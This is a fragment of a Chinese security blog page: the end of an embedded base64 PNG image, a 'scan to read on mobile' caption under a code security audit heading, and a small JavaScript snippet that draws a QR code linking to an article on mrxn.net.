Y833ArKm5xN9B6H1rHfQc2K+axPnewDogqacQWP4SeVYMrhk12Uc4sCa88LohOZ0Pwek1BOapaXKy7Fn+aCu+cjVWfbgjlCZ2pBn5aCvC/D2BubH+WR+Oa8G57GHsCc6NnHwwD1z/QHX7sI/rR9bfNhDo1yl7h85B//dp6Hy0FaFrYO9Hm+sOPV9ziYNCsF7+ysB56HvOWiv9UW7FVw76WmA/mjO8bshqEm/k2tve7CHTq3H4EaMBPwGJR4R9bqyPH31icE1iYTTgXGLlYuFgrwkfnRCsAaO4auBcrU+8wvRILrEQ3A+M0YBj4HpRv33YR/uRpQnK6v6gTy85MJc4qPoji2ZEcJ/UjLmf+OkTrD3A6wEtdaSVoOaA7RdE5WTgGDqKl9XaFQeui1bYBqKCy95/Am0g4GnBHldb1CRlq9yf4rTeysb1wHsPB/v4UX3qguD6WgczX2sSjwiuG7nqt4HUxBW/5wTan07qU3C2HfCkU/OMNhpwLfTfBWoufaFr4bF/1Kfy8LgXzPtLn9X+kgvCvEZyqQ+GF143RKfwQXYN5HQYr09OvxhmC7lOI9Zc4iD0axou9YlHhK6H+UdEaoVjnXxxR6a8DNw/OnHfMXB9rYGZzxoVa61i2NeDY+D6xfD2YR/tRR36lOA5P99LfSoUJwfulXiF0suSg7lGeVk0QbAWCPUUqpcsYvmyxCsEtl8MpZOdaVa5I069YtdryNEpvYlvA8mEnsGjvYKfIKBJ0i9E4hGB7cmrGjAPJDXh2Kcmk6u8YmBbMxpwrFw1cO4ZbTS1x1kM7g9cryG3D/toNyT7gj4t2PvRVATr8nQIwRwYxcnAMdDaiJeFALanN7EQ9hw4hhmll4Fz8mVao5p4WXj5sXBBcL/E0QnBOdijctVSD9aO+WkgY/LyX38C10Bef+anK/7qQMBXEPovefV6JhZC1wNto8rJGnF3FMvu7u5TXGyXuAeVB7YfhcA9609g4xydf00/cE3iM1x1BNevcr86kNUCF/e9E/hjA4H1UwDmgYc7HZ884OGTPOrlw3ENOCedbLUZsAb2GC3seehxNOodCxcMP+IfG0gWvfB7JzANZJxW9Y9aV53iI+2Kl14GfsKiAcdAqN3/baKallg4ysuA7XbJrwbOpbzmx/gZTfTRgvtDf11NboXTQFaii3vdCbSBQJ8knPvPbC9PCrhX4hXCXpP+ozZcEFyTeETY59IHzAOjfPOB7RbBMW7Cgy+wr4ssawsrB64JL2wDUXDZ+0/gGsj7Z7Dbwf8AAAD//26/xtQAAAAGSURBVAMAd8bVib2DE2cAAAAASUVORK5CYII=)

手机扫码阅读

代码安全审计


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/kuaipu-WebService-wsAutoComplete.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 